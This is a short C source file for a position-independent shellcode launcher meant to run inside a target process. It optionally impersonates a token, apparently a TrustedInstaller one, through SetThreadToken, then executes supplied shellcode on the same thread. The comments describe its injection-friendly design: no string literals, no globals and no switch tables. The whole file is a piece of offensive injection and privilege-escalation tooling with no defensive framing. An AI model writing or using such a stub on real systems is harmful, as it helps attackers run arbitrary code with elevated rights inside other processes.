// stub_sc.c — position-independent shellcode launcher, run inside the target.
//
// Minimal PIC stub: impersonate a token (SetThreadToken) then call the
// shellcode INLINE on this same thread (a new thread would drop the token).
// No string literals, no globals, no switch tables.

#include <windows.h>

typedef BOOL (*fn_set_token)(HANDLE, HANDLE);

struct ctx {
    void *token;            /* TI impersonation token handle, NULL = none */
    fn_set_token set_token; /* SetThreadToken */
    void *shellcode;        /* shellcode bytes (executable) */
};

__declspec(noinline) void stub(struct ctx *c) {
    if (c->token)
        c->set_token(NULL, (HANDLE)c->token);
    ((void (*)())c->shellcode)();
}
